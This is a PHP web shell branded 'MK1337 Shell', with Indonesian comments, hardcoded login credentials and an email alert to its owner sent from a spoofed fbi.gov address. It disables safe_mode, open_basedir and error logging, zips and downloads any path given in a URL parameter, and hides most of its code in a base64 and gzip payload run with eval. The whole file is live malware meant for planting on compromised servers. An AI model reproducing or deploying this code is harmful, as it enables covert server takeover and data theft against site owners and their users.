<?php
/*
Manusia Biasa yang Bercita - cita Masuk Surga
*/

ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');


function Zip($source, $destination) 
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

if(isset($_GET['zip'])) {
	$src = $_GET['zip'];
	$dst = getcwd()."/".basename($_GET['zip']).".zip";
	if (Zip($src, $dst) != false) {
		$filez = file_get_contents($dst);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($filez));
		header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
		echo $filez;
	}
	exit;
}

// ------------------------------------- Ganti value ini agar shell kamu tidak tertikung :) ---------------------------------\
// ------------------------------------- Ini seperti logger tetapi saya membuat ini agar tidak kecolongan, ganti value ini ke email kalian! --------------------------------

$greeting 		= "W3lc0m3 MK1337";
$user 			= "mk1337";
$pass 			= "mk1337";
$lock 			= "on"; // on untuk akitifin login page, off untuk menonaktifan login page
$antiCrawler 		= "off"; // crawler
$tracebackFeature 	= "on"; // email alert
$ownerEmail 		= "4famos@gmail.com"; 
$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion		= phpversion();
$self			= $_SERVER["PHP_SELF"]; 
$sm 			= @ini_get('safe_mode');
$SEPARATOR 		= '/'; 
$os 			= "N/D";

if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}

else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}


function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           
    $from = "mk1337$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Terakses -- MK1337 - Shell --";
        $message = "
Hey MK1337 ,
        
         shell terakses $url  by $accesedIp
      
Greetzz LXPLOIT, Cukimay Cyber Team, Lumajang Hack Team, Korek Api Security

        MK1337
";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------


if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
}

//logout

if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  
    ini_set('log_errors',0);    
    ini_set('file_uploads',1); 
    ini_set('allow_url_fopen',1);  
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}

// ----------------------------------------------------------------------------------------------------------------


?>
<html>
<head>
<title>MK1337&mdash;Shell | LXPLOIT</title>

<?php /*** Decode this to see the source code ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=d1a7776cb74aaca9b90f3971f24d1016cd1fd5e77T1pU+NIsp+biP4PhZYd2zOAD2C2wcAsmMs0GBqbc3qCkCXZFsiSV5IBM9v//WVW6VZJso3p6X0xdEDbUlZWVlZWXnWpnfyCqNtqzRSfNcUk81skZ3Q6ucLHuT8/zhH4YX83+4otEl3sK1vCxdnuWaspEMnQbUW3t4TGWb2xt3+zSBpnB2cnJ2fXAiluu6W/fZzDf5uWPdKUbfxY/Pnj3Fbij19nrdkkTUWyVUNPK/Bx7uciov2ZOBQPRFlW9e5Gqcq+90Wzq+r0KyWmZ/e1RdI25BGW+NBT1G7P3iDlUumfLsg/sG2iqgNHAKSv6ksRKIZzqW3YttHfIEsrK6XBCzwfGJaKBG8QU9FEW31SPJQdw7AZPhdXdqFlSVNEM7kkfb0BbbF7XhER+tH2uq8tSo9d0xjq8oapyA5HJEMzzI3nnmorzpMOtHfpmWFvG5rMsNnysqp3DA/ZsyrbvQ1WNausreoy8SszTFkBesqDF2IZmiqTf6zQn3BPkPIaAIhD2yClYP2W+qpsEKsvappbgaw+LStQxc9eHT4kFzBCq9NdEU78o1KpuAUHy21N1R+9crbyYi/JimSYIusT+tqFplLDYe4SY2lbgychJpvddn5lbbH8qbK4sl4ItrYj9lVttNESe0ZfXLxSTFnUxcUdUxW1DKao+mBoLxvPOkmigxyaiqKHCCHB7mYdRUI9JUmS10rNkB7/MwSpW6YVc5jPKFLMcB2Wqj15zygnRU3tAhMlUBT0BcVvi21NWe6ommJFZGfJGogSDl4YaFTM0vjQK0eHPFn1CjmPvCHqo3PGronCDixYc8UZRUgzukaUJNMZ+Siz/xmKjF9+kZ4iApRXyK1XUzq2izyhEVEmYREfry4+eUgdkm1jsFH2MDrK4Fe/ZXE58HvVQUmGfm9qqgUkoV7eILqhK1UuMwNlNdWXBM0QbY/kKFtD3RdoYlAM8LFoKuKy1JcjLA8LZrlcTmgfwHUDgh4cVqTZUzwmu8DBIRBgKVnhyRpnyIUozR77ofqYPiKrpUB3JY5CV/v2wQYhn3gDUIMGOIbiH6wxVlRemAyWY6JPGx14HLYH39wBCmDRseCOJp9iHBLhJvqG9B+sVGyQA2KSgMOBoJSnAaQSEh+4MZCwAS959g6VEhHJInE+JdoFZ8BA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